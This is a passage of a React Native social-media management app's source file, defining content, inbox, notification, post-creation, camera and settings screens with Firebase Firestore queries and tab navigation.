                paddingHorizontal: 10,
                paddingVertical: 6,
                flexDirection: "row",
                marginTop: 10,
              }}
              onPress={CreateContent}
            >
              <Text
                style={{
                  fontWeight: "700",
                  color: Colors.textWhite,
                }}
              >
                Create Ad
              </Text>
            </TouchableOpacity>
          }
        />

        <View style={{ height: 700, padding: 10 }}>
          <Image
            source={require("./assets/images/chart-1.png")}
            style={{ width: "100%", height: 420, objectFit: "cover" }}
          />
          <View
            style={{
              padding: 20,
            }}
          >
            <Text style={{ fontSize: 17, fontWeight: "bold" }}>
              Expend your reach:
            </Text>
            <View style={{ flexDirection: "row", alignItems: "center" }}>
              <Text
                style={{
                  fontSize: 15,
                  marginTop: 10,
                }}
              >
                Facebook reach:
              </Text>
              <Text
                style={{
                  fontSize: 15,
                  color: Colors.successColor,
                  marginTop: 10,
                }}
              >
                12% - 22%
              </Text>
            </View>
            <TouchableOpacity
              style={{
                width: "100%",
                height: 44,
                borderRadius: 6,
                backgroundColor: Colors.bgPrimary,
                justifyContent: "center",
                alignItems: "center",
                paddingHorizontal: 10,
                paddingVertical: 6,
                flexDirection: "row",
                marginTop: 20,
              }}
              onPress={() => navigation.navigate("CreatePost")}
            >
              <Text
                style={{
                  fontWeight: "700",
                }}
              >
                Create Ad
              </Text>
            </TouchableOpacity>
          </View>
        </View>
      </View>
      <View height={100}></View>
    </SafeAreaView>
  );
}
function ContentScreen({ navigation }) {
  const [posts, setPosts] = React.useState([]);
  const [active, setActive] = React.useState(2);
  const [loading, setLoading] = React.useState(false);

  const onActive = function (state) {
    setActive(state);
  };

  const CreateContent = () => {
    navigation.navigate("CreatePost");
  };

  React.useEffect(() => {
    const initData = async () => {
      setLoading(true);
      await firebase
        .firestore()
        .collection(active === 1 ? "posts" : "planners")
        .orderBy(active === 1 ? "createdAt" : "date", "desc")
        .limit(10)
        .get()
        .then((querySnapshot) => {
          console.log(querySnapshot.docs);
          const data = [];
          querySnapshot.forEach((doc) => {
            data.push({ ...doc.data(), docId: doc.id });
          });

          setPosts(data);
          setLoading(false);
        });
    };
    initData();
  }, [active]);

  const stylesActive = {
    width: "46%",
    height: 44,
    borderRadius: 6,
    backgroundColor: Colors.primaryColor,
    justifyContent: "center",
    alignItems: "center",
    paddingHorizontal: 10,
    paddingVertical: 6,
    flexDirection: "row",
    marginTop: 10,
  };

  const styleDeAtive = {
    width: "46%",
    height: 44,
    borderRadius: 6,
    justifyContent: "center",
    alignItems: "center",
    paddingHorizontal: 10,
    paddingVertical: 6,
    flexDirection: "row",
    marginTop: 10,
  };

  return (
    <SafeAreaView style={stylesHomePage.container}>
      <View>
        <View
          style={{
            flexDirection: "row",
            justifyContent: "space-between",
            alignItems: "center",
            paddingHorizontal: 20,
          }}
        >
          <Text style={{ fontSize: 17, fontWeight: "bold" }}>Content</Text>
          <TouchableOpacity
            style={{
              height: 35,
              borderRadius: 24,
              backgroundColor: Colors.primaryColor,
              justifyContent: "center",
              alignItems: "center",
              paddingHorizontal: 10,
              paddingVertical: 6,
              flexDirection: "row",
              marginTop: 10,
            }}
            onPress={CreateContent}
          >
            <Text
              style={{
                fontWeight: "700",
                color: Colors.textWhite,
              }}
            >
              Create
            </Text>
          </TouchableOpacity>
        </View>
        <View
          style={{
            flexDirection: "row",
            justifyContent: "space-between",
            padding: 20,
          }}
        >
          <TouchableOpacity
            style={active === 1 ? stylesActive : styleDeAtive}
            onPress={() => onActive(1)}
          >
            <Text
              style={
                active === 1
                  ? {
                      fontWeight: "700",
                      color: Colors.textWhite,
                    }
                  : {
                      fontWeight: "500",
                      color: Colors.textColor,
                    }
              }
            >
              Mentions & Tags
            </Text>
          </TouchableOpacity>
          <View style={{ width: "8%" }} />
          <TouchableOpacity
            style={active === 2 ? stylesActive : styleDeAtive}
            onPress={() => onActive(2)}
          >
            <Text
              style={
                active === 2
                  ? {
                      fontWeight: "700",
                      color: Colors.textWhite,
                    }
                  : {
                      fontWeight: "500",
                      color: Colors.textColor,
                    }
              }
            >
              Planners
            </Text>
          </TouchableOpacity>
        </View>
      </View>
      <View
        style={{
          flex: 1,
          flexGrow: 2,
          height: "100%",
        }}
      >
        {active === 1 ? (
          <ListPosts
            posts={posts}
            loading={loading}
            styles={{ paddingHorizontal: 10, paddingBottom: 40 }}
          />
        ) : (
          <Planners
            data={posts}
            loading={loading}
            styles={{ paddingHorizontal: 10, paddingBottom: 40 }}
          />
        )}
      </View>
      <View height={40}></View>
    </SafeAreaView>
  );
}

function EmptyScreen() {
  return <View />;
}

function InboxScreen({ navigation }) {
  const [posts, setPosts] = React.useState([]);
  const [active, setActive] = React.useState(2);
  const [loading, setLoading] = React.useState(false);
  const onActive = function (state) {
    setActive(state);
  };

  const CreateContent = () => {
    navigation.navigate("CreatePost");
  };

  React.useEffect(() => {
    const initData = async () => {
      setLoading(true);
      await firebase
        .firestore()
        .collection(active === 1 ? "messages" : "comments")
        .orderBy("timestamp", "desc")
        .limit(10)
        .get()
        .then((querySnapshot) => {
          console.log(querySnapshot.docs);
          const data = [];
          querySnapshot.forEach((doc) => {
            data.push({ ...doc.data(), docId: doc.id });
          });

          setPosts(data);
          setLoading(false);
        });
    };
    initData();
  }, [active]);

  const stylesActive = {
    width: 100,
    height: 35,
    borderRadius: 24,
    borderWidth: 2,
    borderColor: Colors.primaryColor,
    justifyContent: "center",
    alignItems: "center",
    paddingHorizontal: 10,
    paddingVertical: 6,
    flexDirection: "row",
    marginTop: 10,
  };

  const styleDeAtive = {
    width: 100,
    height: 35,
    borderRadius: 6,
    justifyContent: "center",
    alignItems: "center",
    paddingHorizontal: 10,
    paddingVertical: 6,
    flexDirection: "row",
    marginTop: 10,
  };

  return (
    <SafeAreaView style={stylesHomePage.container}>
      <View style={{ padding: 20, flex: 1 }}>
        <View>
          <Text style={{ fontSize: 17, fontWeight: "bold" }}>Home</Text>
        </View>
        <View style={{ flexDirection: "row", marginTop: 10 }}>
          <TouchableOpacity
            style={active === 1 ? stylesActive : styleDeAtive}
            onPress={() => onActive(1)}
          >
            <Text
              style={
                active === 1
                  ? {
                      fontWeight: "700",
                      color: Colors.primaryColor,
                    }
                  : {
                      fontWeight: "500",
                      color: Colors.textColor,
                    }
              }
            >
              Messages
            </Text>
          </TouchableOpacity>
          <View style={{ width: "8%" }} />
          <TouchableOpacity
            style={active === 2 ? stylesActive : styleDeAtive}
            onPress={() => onActive(2)}
          >
            <Text
              style={
                active === 2
                  ? {
                      fontWeight: "700",
                      color: Colors.primaryColor,
                    }
                  : {
                      fontWeight: "500",
                      color: Colors.textColor,
                    }
              }
            >
              Comments
            </Text>
          </TouchableOpacity>
        </View>
        <View style={{ marginTop: 10 }}>
          <Text style={{ fontSize: 16, fontWeight: "600" }}>
            All {active === 1 ? "messages" : "comments"}
          </Text>
        </View>
        {active === 1 ? (
          <Messages data={posts} loading={loading} styles={{ paddingHorizontal: 10}} />
        ) : (
          <Comments data={posts} loading={loading} styles={{ paddingHorizontal: 10 }} />
        )}
      </View>
      <View height={40}></View>
    </SafeAreaView>
  );
}

export const CustomHeader = ({
  title,
  showBack,
  right,
  info,
  disabled,
  onPress,
  styleHeader,
  titleLeft,
  titleRight,
  navigation,
}) => {
  const b = { disabled, onPress };
  const iconSize = 22;

  const handleBack = (e) => {
    navigation.goBack();
  };

  return (
    <View
      style={{
        flexDirection: "row",
        alignItems: "center",
        height: 60,
        paddingHorizontal: 20,
        justifyContent: "space-between",
        ...styleHeader,
      }}
    >
      <View style={{ flexDirection: "row", alignItems: "center" }}>
        {showBack ? (
          <View
            style={{ flexDirection: "row", alignItems: "center", margin: 5 }}
          >
            <TouchableOpacity onPress={handleBack} style={{ marginRight: 10 }}>
              <ChevronLeftIcon color="black" />
            </TouchableOpacity>
            {titleLeft ? (
              <Text style={{ fontSize: 17, fontWeight: "600" }}>
                {titleLeft}
              </Text>
            ) : null}
          </View>
        ) : null}
      </View>

      <View style={{ flexDirection: "row", alignItems: "center" }}>
        {info ? (
          <Text style={{ fontSize: 17, fontWeight: "600" }}>{info}</Text>
        ) : null}

        {right ? (
          <View style={{ flexDirection: "row", alignItems: "center" }}>
            <TouchableOpacity onPress={handleBack}>{right}</TouchableOpacity>
            {titleRight ? (
              <Text style={{ fontSize: 17, fontWeight: "600" }}>
                {titleRight}
              </Text>
            ) : null}
          </View>
        ) : null}
      </View>
    </View>
  );
};

function NotificationsScreen({ navigation }) {
  const ref = React.useRef(null);
  const [notifications, setNotifications] = React.useState([]);

  React.useEffect(() => {
    const initData = async () => {
      await firebase
        .firestore()
        .collection("notifications")
        .orderBy("timestamp", "desc")
        .onSnapshot((querySnapshot) => {
          const data = [];
          querySnapshot.forEach((doc) => {
            data.push({ ...doc.data(), docId: doc.id });
          });
          setNotifications(data);
        });
    };

    // data.forEach(async (item) => {
    //   await firebase
    //   .firestore()
    //   .collection("comments")
    //   .add(item)
    // })

    initData();
  }, []);

  const handleRemoveNoti = async (docId) => {
    const result = await firebase
      .firestore()
      .collection("notifications")
      .doc(docId)
      .delete();

    alert("Deleted Successful");
  };

  const handleRead = async (docId) => {
    const result = await firebase
      .firestore()
      .collection("notifications")
      .doc(docId)
      .update({ readed: true });

    Alert.alert("Notification", "Update Readed");
  };

  return (
    <SafeAreaView style={stylesHomePage.container}>
      <CustomHeader
        showBack
        titleLeft="Notifications"
        navigation={navigation}
      />
      <ScrollView style={{ marginTop: 10, paddingHorizontal: 20 }}>
        {notifications.map((data) => (
          <TouchableOpacity
            onPress={() => handleRead(data.docId)}
            key={data.name}
            style={[
              stylesHomePage.card,
              stylesHomePage.shadowProp,
              {
                marginTop: 10,
                borderBottomWidth: 1,
                borderColor: Colors.bgSecondaryLight,
                flexDirection: "row",
                paddingHorizontal: 10,
                paddingVertical: 10,
                alignItems: "center",
              },
            ]}
          >
            <View style={{ position: "relative", flexGrow: 2 }}>
              <Text style={{ fontWeight: data?.readed ? "400" : "700" }}>
                {data.name}
              </Text>
              <Text
                style={{
                  marginTop: 5,
                  fontWeight: data?.readed ? "300" : "400",
                }}
              >
                {data.text}
              </Text>
              {data.readed ? null : (
                <View
                  style={[
                    stylesHomePage.bage,
                    {
                      top: 0,
                      right: 0,
                    },
                  ]}
                  onPress={() => handleRemoveNoti(data.docId)}
                />
              )}
              <Text
                style={{
                  position: "absolute",
                  right: 0,
                  bottom: -5,
                  color: Colors.bgSecondaryLight,
                }}
              >
                {data.time || "an hour ago"}
              </Text>
              <View style={{ height: 14 }}></View>
            </View>
          </TouchableOpacity>
        ))}
      </ScrollView>
    </SafeAreaView>
  );
}

function ImageViewer({
  placeholderImageSource,
  selectedImage,
  styles,
  removeImageByIdx,
}) {
  const imageSource = selectedImage
    ? { uri: selectedImage }
    : placeholderImageSource;

  return (
    <View style={{ position: "relative" }}>
      <Image source={imageSource} style={styles} />
      <TouchableOpacity
        style={{
          position: "absolute",
          right: 5,
        }}
        onPress={removeImageByIdx}
      >
        <TimesIcon width={15} />
      </TouchableOpacity>
    </View>
  );
}

function CameraModal({ modalVisible, setModalVisible, addImage }) {
  const [type, setType] = useState(CameraType.back);
  const [permission, requestPermission] = Camera.useCameraPermissions();
  const [cameraRef, setCameraRef] = useState(null);

  if (!permission) {
    // Camera permissions are still loading
    return <View />;
  }

  if (!permission.granted) {
    // Camera permissions are not granted yet
    return (
      <View style={stylesCamera.container}>
        <Text style={{ textAlign: "center" }}>Allow camera</Text>
        <Button onPress={requestPermission} title="grant permission" />
      </View>
    );
  }

  function toggleCameraType() {
    setType((current) =>
      current === CameraType.back ? CameraType.front : CameraType.back
    );
  }

  async function handeTakeCamera() {
    if (cameraRef) {
      const photo = await cameraRef.takePictureAsync();
      addImage(photo?.uri);
      setModalVisible(false);
    }
  }

  function handleBack() {
    setModalVisible(false);
  }

  return (
    <Modal
      animationType="slide"
      visible={modalVisible}
      onRequestClose={() => {
        setModalVisible(!modalVisible);
      }}
    >
      <Camera
        style={stylesCamera.camera}
        type={type}
        ref={(ref) => setCameraRef(ref)}
      >
        <View style={stylesCamera.header}>
          <TouchableOpacity
            onPress={handleBack}
            style={{
              width: 40,
              height: 40,
              borderRadius: 999,
              justifyContent: "center",
              alignItems: "center",
              backgroundColor: "#000000",
              opacity: 0.3,
            }}
          >
            <ChevronLeftIcon color={Colors.textWhite} />
          </TouchableOpacity>
        </View>
        <View style={stylesCamera.buttonContainer}>
          <TouchableOpacity
            style={{ position: "absolute", left: 0, padding: 15 }}
            onPress={toggleCameraType}
          >
            <ArrowPathIcon color={Colors.textWhite} width={30} height={30} />
          </TouchableOpacity>
          <TouchableOpacity
            style={{
              backgroundColor: "#0000004a",
              padding: 15,
              borderRadius: 12,
            }}
            onPress={handeTakeCamera}
          >
            <TakeCamera color={Colors.textWhite} width={30} height={30} />
          </TouchableOpacity>
        </View>
      </Camera>
    </Modal>
  );
}

const stylesCamera = StyleSheet.create({
  container: {
    flex: 1,
    justifyContent: "center",
  },
  camera: {
    flex: 1,
    position: "relative",
  },
  header: {
    position: "absolute",
    left: 20,
    top: 40,
  },
  buttonContainer: {
    flex: 1,
    flexDirection: "row",
    backgroundColor: "transparent",
    margin: 64,
    position: "relative",
    justifyContent: "center",
    alignItems: "flex-end",
  },
  button: {},
  text: {
    fontSize: 24,
    fontWeight: "bold",
    color: "white",
  },
});

const CreatePost = ({ navigation }) => {
  const [loading, setLoading] = React.useState(false);
  const [text, setText] = React.useState("");
  const [imageList, setImageList] = React.useState([]);
  const [modalVisible, setModalVisible] = useState(false);

  const goToHome = () => {
    navigation.navigate("HomeScreen");
  };

  const pickImage = async () => {
    // No permissions request is necessary for launching the image library
    let result = await ImagePicker.launchImageLibraryAsync({
      mediaTypes: ImagePicker.MediaTypeOptions.All,
      allowsMultipleSelection: true,
    });
    if (!result.canceled) {
      setImageList(result.assets.map((item) => item.uri));
    }
  };

  const removeImageByIdx = (idx) => {
    console.log(imageList);
    const list = [...imageList];
    list.splice(idx, 1);

    setImageList(list);
  };

  const addImage = (newUri) => {
    console.log("newUri", newUri);
    setImageList([...imageList, newUri]);
  };

  const onChangeText = (txt) => {
    setText(txt);
  };

  const [showToast, setShowToast] = useState(false);

  const showToastMessage = () => {
    showToast(setShowToast);
  };

  const renderToast = () => {
    if (showToast) {
      return (
        <View
          style={{
            position: "absolute",
            bottom: 20,
            left: "50%",
            transform: [{ translateX: -50 }],
            backgroundColor: "green",
            padding: 10,
            borderRadius: 5,
          }}
        >
          <Text style={{ color: "white" }}>Success!</Text>
        </View>
      );
    }
    return null;
  };

  const handleCreatePost = async () => {
    await firebase
      .firestore()
      .collection("posts")
      .add({
        name: "John Doe",
        text: text,
        liked: 0,
        comments: 0,
        shared: 0,
        booked: 0,
        createdAt: new Date().getTime(),
      })
      .then((result) => {
        Alert.alert("Notification", "Created post successfully", [
          {
            text: "New",
            onPress: () => {
              setImageList([]);
              setText("");
            },
            style: "cancel",
          },
          {
            text: "Home",
            onPress: () => {
              setImageList([]);
              setText("");
              goToHome();
            },
            style: "default",
          },
        ]);
      });
  };

  return (
    <SafeAreaView style={stylesHomePage.container}>
      <CustomHeader
        showBack
        titleLeft="Create Post"
        navigation={navigation}
        right={
          <PaperAirplaneIcon
            onPress={handleCreatePost}
            color={Colors.primaryColor}
          />
        }
      />
      <CameraModal
        modalVisible={modalVisible}
        setModalVisible={setModalVisible}
        addImage={addImage}
      />
      <ScrollView style={{ flex: 1 }}>
        <View
          style={{
            alignItems: "center",
            flexDirection: "row",
            borderColor: Colors.bgSecondaryLight,
            borderWidth: 1,
            padding: 10,
            marginHorizontal: 20,
            borderRadius: 24,
          }}
        >
          <Image
            source={require("./assets/images/image-1.jpg")}
            full
            style={{
              width: 40,
              height: 40,
              borderRadius: 100,
              borderColor: "#fff",
              borderWidth: 2,
            }}
          />
          <View style={{ marginLeft: 5, flex: 1 }}>
            <Text style={{ fontSize: 17, fontWeight: "600" }}>John Done</Text>
            <View
              style={{
                flexDirection: "row",
                alignItems: "center",
                marginTop: 5,
              }}
            >
              <View
                style={{
                  backgroundColor: Colors.primaryColor,
                  flexDirection: "row",
                  alignItems: "center",
                  justifyContent: "center",
                  width: 70,
                  borderRadius: 24,
                }}
              >
                <PublicIcon width={18} color={Colors.textWhite} />
                <Text
                  style={{
                    color: Colors.textWhite,
                    marginLeft: 5,
                    fontSize: 12,
                  }}
                >
                  Public
                </Text>
              </View>
              <View
                style={{
                  backgroundColor: Colors.primaryColor,
                  flexDirection: "row",
                  alignItems: "center",
                  justifyContent: "center",
                  width: 70,
                  borderRadius: 24,
                  marginLeft: 10,
                }}
              >
                <PlusOutlineIcon width={18} color={Colors.textWhite} />
                <Text
                  style={{
                    color: Colors.textWhite,
                    marginLeft: 2,
                    fontSize: 12,
                  }}
                >
                  Album
                </Text>
              </View>
            </View>
          </View>
        </View>
        <View style={{ marginTop: 10 }}>
          <TouchableWithoutFeedback
            onPress={Keyboard.dismiss}
            accessible={false}
          >
            <TextInput
              value={text}
              onChangeText={(text) => onChangeText(text)}
              returnKeyType="done"
              rows={4}
              multiline={true}
              placeholder="Share your content"
              style={{
                padding: 20,
                fontSize: 17,
                height: 150,
              }}
            />
          </TouchableWithoutFeedback>
        </View>
        <View style={{ flexDirection: "row", padding: 20 }}>
          <ScrollView horizontal>
            {imageList?.map((image, key) => (
              <ImageViewer
                key={key}
                selectedImage={image}
                removeImageByIdx={() => removeImageByIdx(key)}
                styles={{
                  width: 100,
                  height: 180,
                  borderWidth: 1,
                  borderColor: Colors.bgSecondaryLight,
                  borderRadius: 12,
                  marginRight: 2,
                }}
              />
            ))}
          </ScrollView>
        </View>
        <View style={{ justifyContent: "space-evenly", flexDirection: "row" }}>
          <TouchableOpacity style={stylesNewPost} onPress={pickImage}>
            <PhotoIcon color={Colors.successColor} />
            <View style={{ height: 5 }} />
            <Text style={{ marginTop: 10, color: Colors.textColor }}>
              Photo/Video
            </Text>
          </TouchableOpacity>
          <TouchableOpacity style={stylesNewPost}>
            <MapPinIcon color={Colors.dangerColor} />
            <Text style={{ marginTop: 10, color: Colors.textColor }}>
              Location
            </Text>
          </TouchableOpacity>
          <TouchableOpacity
            style={stylesNewPost}
            onPress={() => setModalVisible(true)}
          >
            <VideoCameraIcon color={Colors.dangerColor} />
            <Text style={{ marginTop: 10, color: Colors.textColor }}>
              Live video
            </Text>
          </TouchableOpacity>
        </View>
        <View
          style={{
            marginTop: 10,
            justifyContent: "space-evenly",
            flexDirection: "row",
          }}
        >
          <TouchableOpacity center style={stylesNewPost}>
            <FaceSmileIcon color={Colors.warnColor} />
            <Text style={{ marginTop: 10, color: Colors.textColor }}>
              Emotions
            </Text>
          </TouchableOpacity>
          <TouchableOpacity
            center
            style={stylesNewPost}
            onPress={() => setModalVisible(true)}
          >
            <CameraIcon color="#6600cc" />
            <Text style={{ marginTop: 10, color: Colors.textColor }}>
              Camera
            </Text>
          </TouchableOpacity>
          <TouchableOpacity center style={stylesNewPost}>
            <ChatBubbleLeftEllipsisIcon color={Colors.primaryColor} />
            <Text style={{ marginTop: 10, color: Colors.textColor }}>
              Get messages
            </Text>
          </TouchableOpacity>
        </View>
      </ScrollView>
      <View
        style={{
          justifyContent: "flex-end",
          padding: 20,
        }}
      >
        <TouchableOpacity
          style={{
            width: "100%",
            height: 44,
            borderRadius: 6,
            backgroundColor: Colors.primaryColor,
            justifyContent: "center",
            alignItems: "center",
            paddingHorizontal: 10,
            paddingVertical: 6,
            flexDirection: "row",
            marginTop: 10,
          }}
          onPress={handleCreatePost}
        >
          <Text
            style={{
              fontWeight: "700",
              color: Colors.textWhite,
              marginRight: 10,
            }}
          >
            Post
          </Text>
          <PaperAirplaneIcon color={Colors.textWhite} />
        </TouchableOpacity>
      </View>
    </SafeAreaView>
  );
};

const stylesNewPost = StyleSheet.create({
  borderRadius: 10,
  backgroundColor: "#f2f2f2de",
  padding: 15,
  width: "30%",
  justifyContent: "ceneter",
  alignItems: "center",
  shadowOffset: { width: 0, height: 2 },
  shadowColor: "#cccccc",
  shadowOpacity: 0.3,
  shadowRadius: 12,
});

function SettingsScreen({ navigation }) {
  const [avatar, setAvatar] = React.useState("");
  const [name, setName] = React.useState("");
  const [planner, setPlanner] = React.useState("");
  const [darkMode, setDarkMode] = React.useState(false);
  const [showAds, setShowAds] = React.useState(true);
  const [enableNotifications, setEnableNotifications] = React.useState(true);

  const handleSaveChanges = () => {
    // Handle saving changes to the server or local storage
    console.log("Changes saved:", {
      avatar,
      name,
      planner,
      darkMode,
      showAds,
      enableNotifications,
    });
  };

  const handleAvatarChange = (image) => {
    setAvatar(image.uri);
  };

  function handleGoNotifications() {
    navigation.navigate("Notifications");
  }

  return (
    <SafeAreaView style={stylesHomePage.container}>
      <View style={{ padding: 20 }}>
        <View
          style={{
            flexDirection: "row",
            alignItems: "center",
            justifyContent: "space-between",
          }}
        >
          <Text style={{ fontSize: 17, fontWeight: "bold" }}>Menu</Text>
          <TouchableOpacity
            style={{
              width: 40,
              height: 40,
              borderRadius: 999,
              justifyContent: "center",
              alignItems: "center",
              paddingHorizontal: 10,
              paddingVertical: 6,
              flexDirection: "row",
              backgroundColor: "#f2f2f2",
            }}
            onPress={() => navigation.navigate("HomeScreen")}
          >
            <MagnifyingGlassIcon color={Colors.textColor} />
          </TouchableOpacity>
        </View>
        <View
          style={{
            marginTop: 20,
            alignItems: "center",
            flexDirection: "row",
            backgroundColor: Colors.primaryColor,
            borderRadius: 12,
            padding: 15,
          }}
        >
          <Image
            source={require("./assets/images/image-1.jpg")}
            full
            style={{
              width: 50,
              height: 50,
              borderRadius: 100,
              borderColor: "#fff",
              borderWidth: 2,
            }}
          />
          <View
            style={{
              flexDirection: "row",
              justifyContent: "space-between",
              alignItems: "center",
              flex: 1,
            }}
          >
            <View style={{ marginLeft: 10 }}>
              <Text style={{ fontSize: 17, fontWeight: "bold", color: Colors.textWhite }}>
                John Done
              </Text>
              <Text style={{ marginTop: 5, fontSize: 12, color: Colors.textWhite }}>
                Software Engineer
              </Text>
            </View>
            <View>
              <TouchableOpacity>
                <ArrowPathIcon color={Colors.primaryColor} />
              </TouchableOpacity>
            </View>
          </View>
        </View>
        <View style={{ marginTop: 20 }}>
          <TouchableOpacity
            style={{
              width: "100%",
              borderRadius: 12,
              height: 50,
              justifyContent: "center",
              alignItems: "center",
              paddingHorizontal: 10,
              paddingVertical: 6,
              flexDirection: "row",
              backgroundColor: "#f6f7f8",
              marginTop: 10,
            }}
            onPress={handleGoNotifications}
          >
            <View
              style={{
                width: "100%",
                flexDirection: "row",
                justifyContent: "space-between",
                padding: 10,
                alignItems: "center",
              }}
            >
              <Text color={Colors.textColor}>Notifications</Text>
              <ChevronRightIcon color="#cccccc" />
            </View>
          </TouchableOpacity>
          <TouchableOpacity
            style={{
              width: "100%",
              borderRadius: 12,
              height: 50,
              justifyContent: "center",
              alignItems: "center",
              paddingHorizontal: 10,
              paddingVertical: 6,
              flexDirection: "row",
              backgroundColor: "#f6f7f8",
              marginTop: 10,
            }}
            onPress={() => navigation.navigate("ContentScreen")}
          >
            <View
              style={{
                width: "100%",
                flexDirection: "row",
                justifyContent: "space-between",
                padding: 10,
                alignItems: "center",
              }}
            >
              <Text color={Colors.textColor}>Mentions & Tag - Planners</Text>
              <ChevronRightIcon color="#cccccc" />
            </View>
          </TouchableOpacity>
          <TouchableOpacity
            style={{
              width: "100%",
              borderRadius: 12,
              height: 50,
              justifyContent: "center",
              alignItems: "center",
              paddingHorizontal: 10,
              paddingVertical: 6,
              flexDirection: "row",
              backgroundColor: "#f6f7f8",
              marginTop: 10,
            }}
            onPress={() => navigation.navigate("InboxScreen")}
          >
            <View
              style={{
                width: "100%",
                flexDirection: "row",
                justifyContent: "space-between",
                padding: 10,
                alignItems: "center",
              }}
            >
              <Text color={Colors.textColor}>Messages - Comments</Text>
              <ChevronRightIcon color="#cccccc" />
            </View>
          </TouchableOpacity>
          <TouchableOpacity
            style={{
              width: "100%",
              borderRadius: 12,
              height: 50,
              justifyContent: "center",
              alignItems: "center",
              paddingHorizontal: 10,
              paddingVertical: 6,
              flexDirection: "row",
              backgroundColor: "#f6f7f8",
              marginTop: 10,
            }}
            onPress={() => navigation.navigate("HOmeScreen")}
          >
            <View
              style={{
                width: "100%",
                flexDirection: "row",
                justifyContent: "space-between",
                padding: 10,
                alignItems: "center",
              }}
            >
              <Text color={Colors.textColor}>Home</Text>
              <ChevronRightIcon color="#cccccc" />
            </View>
          </TouchableOpacity>
        </View>
        {/* <View style={{ marginTop: 20 }}>
          <View style={stylesProfile.switchContainer}>
            <Text style={{ fontWeight: "600" }}>Dark Mode</Text>
            <Switch
              onColor={Colors.$textGeneral}
              value={darkMode}
              onValueChange={() => setDarkMode(!darkMode)}
            />
          </View>

          <View style={stylesProfile.switchContainer}>
            <Text style={{ fontWeight: "600" }}>Show Ads</Text>
            <Switch
              onColor={Colors.$textGeneral}
              value={showAds}
              onValueChange={() => setShowAds(!showAds)}
            />
          </View>

          <View style={stylesProfile.switchContainer}>
            <Text style={{ fontWeight: "600" }}>Enable Notifications</Text>
            <Switch
              onColor={Colors.$textGeneral}
              value={enableNotifications}
              onValueChange={() => setEnableNotifications(!enableNotifications)}
            />
          </View>
        </View> */}
      </View>
    </SafeAreaView>
  );
}
const stylesProfile = StyleSheet.create({
  switchContainer: {
    flexDirection: "row",
    justifyContent: "space-between",
    alignItems: "center",
    padding: 10,
  },
});
const Stack = createNativeStackNavigator();
const Tab = createBottomTabNavigator();
const TabBarPlusButton = ({ navigation }) => {
  const onPress = () => {
    navigation.navigate("CreatePost");
  };

  return (
    <>
      <View
        style={{
          justifyContent: "center",
          alignItems: "center",
          position: "relative",
          top: -20,
        }}
      >
        <View
          style={{
            width: 60,
            height: 60,
            borderRadius: 999,
            backgroundColor: Colors.textWhite,
          }}
        />
        <TouchableOpacity
          onPress={onPress}
          style={{
            justifyContent: "center",
            alignItems: "center",
            width: 50,
            height: 50,
            backgroundColor: Colors.primaryColor,
            borderRadius: 999,
            position: "absolute",
          }}
        >
          <PlusOutlineIcon size={28} color={Colors.textWhite} />
        </TouchableOpacity>
      </View>
    </>
  );
};

function TabScreen() {
  return (
    <Tab.Navigator>
      <Tab.Screen
        options={{
          gestureEnabled: false,
          headerShown: false,
          tabBarShowLabel: false,
          tabBarStyle: {
            position: "absolute",
            shadowColor: "#fff",
            shadowOffset: {
              width: 0,
              height: 10,
            },
            shadowOpacity: 0,
            shadowRadius: 3.5,
            elevation: 0,
            height: 80,
            bottom: 0,
            paddingTop: 10,
          },
          tabBarIcon: ({ focused }) => (
            <View style={{ justifyContent: "center", alignItems: "center" }}>
              <Image
                source={require("./assets/images/image-1.jpg")}
                full
                style={{
                  width: 30,
                  height: 30,
                  borderRadius: 100,
                  borderColor: "#fff",
                  borderWidth: 2,
                }}
              />
              <Text
                style={{
                  color: focused ? Colors.primaryColor : Colors.textColor,
                }}
              >
                Home
              </Text>
            </View>
          ),
        }}
        name="HomeScreen"
        component={HomeScreen}
      />
      <Tab.Screen
        options={{
          gestureEnabled: false,
          headerShown: false,
          tabBarShowLabel: false,
          tabBarStyle: {
            position: "absolute",
            shadowColor: "#fff",
            shadowOffset: {
              width: 0,
              height: 10,
            },
            shadowOpacity: 0,
            shadowRadius: 3.5,
            elevation: 0,
            height: 80,
            bottom: 0,
            paddingTop: 10,
          },
          tabBarIcon: ({ focused }) => (
            <View style={{ justifyContent: "center", alignItems: "center" }}>
              <NewsIcon
                size={28}
                color={focused ? Colors.primaryColor : Colors.textColor}
              />
              <Text
                style={{
                  color: focused ? Colors.primaryColor : Colors.textColor,
                }}
              >
                Content
              </Text>
            </View>
          ),
        }}
        name="ContentScreen"
        component={ContentScreen}
      />
      <Tab.Screen
        options={({ navigation }) => ({
          tabBarButton: (props) => (
            <TabBarPlusButton {...props} navigation={navigation} />
          ),
        })}
        name="Empty"
        component={EmptyScreen}
      />
      <Tab.Screen
        options={{
          gestureEnabled: false,
          headerShown: false,
          tabBarShowLabel: false,
          tabBarStyle: {
            position: "absolute",
            shadowColor: "#fff",
            shadowOffset: {
              width: 0,
              height: 10,
            },
            shadowOpacity: 0,
            shadowRadius: 3.5,
            elevation: 0,
            height: 80,
            bottom: 0,
            paddingTop: 10,
          },
          tabBarIcon: ({ focused }) => (
            <View style={{ justifyContent: "center", alignItems: "center" }}>
              <ChatBubbleLeftEllipsisIcon
                size={28}
                color={focused ? Colors.primaryColor : Colors.textColor}
              />
              <Text
                style={{
                  color: focused ? Colors.primaryColor : Colors.textColor,
                }}
              >
                Inbox
              </Text>
            </View>
          ),
        }}
        name="InboxScreen"
        component={InboxScreen}
      />
      <Tab.Screen
        options={{
          gestureEnabled: false,
          headerShown: false,
          tabBarShowLabel: false,
          tabBarStyle: {
            position: "absolute",
            shadowColor: "#fff",
            shadowOffset: {
              width: 0,
              height: 10,
            },
            shadowOpacity: 0,
            shadowRadius: 3.5,
            elevation: 0,
            height: 80,
            bottom: 0,
            paddingTop: 10,
          },
          tabBarIcon: ({ focused }) => (
            <View style={{ justifyContent: "center", alignItems: "center" }}>
              <Bars3Icon
                size={28}
                color={focused ? Colors.primaryColor : Colors.textColor}
              />
              <Text
                style={{
                  color: focused ? Colors.primaryColor : Colors.textColor,
                }}
              >
                More
              </Text>
            </View>
          ),
        }}
        name="SettingsScreen"
        component={SettingsScreen}
      />
    </Tab.Navigator>
  );
}

function App() {
  return (
    <NavigationContainer>
      <StatusBar barStyle="dark-content" />
      <Stack.Navigator
        initialRouteName="TabScreen"
        screenOptions={{ headerShown: false }}
      >
        <Stack.Screen
          options={{ headerShown: false }}
          name="TabScreen"
          component={TabScreen}
        />
        <Stack.Screen
          options={{ headerShown: false }}
          name="Notifications"
          component={NotificationsScreen}
        />
        <Stack.Screen
          options={{ headerShown: false }}
